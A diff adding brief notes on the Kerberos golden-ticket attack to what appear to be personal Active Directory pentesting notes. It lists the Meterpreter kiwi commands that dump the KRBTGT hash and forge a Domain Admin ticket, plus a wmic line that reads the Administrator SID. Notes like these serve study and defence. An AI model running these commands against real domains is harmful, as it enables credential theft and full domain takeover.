@@ -149,6 +149,17 @@ Kerberos is a stateless protocol.
 The KRBTGT is a local default account that acts as a service account for the Key Distribution Center service. This account cannot be deleted, and the account name cannot
 be changed. The KRBTGT account cannot be enabled in Active Directory.
 
+Golden Ticket
+Golden Ticket = Forged TGT (We forge Domain Admin account's TGT)
+We need domain name, domain SID, domain KRBTGT account NTLM password hash, userID for impersonation
+dcsync_ntlm krbtgt (kiwi command)
+golden_ticket_create -d <domain> -u <user> -s <domainSID> -k <krbtgt_nthash> -t <out> (kiwi command)
+wmic useraccount where name='Administrator' get sid
+
+
+
+
+
 
 
 
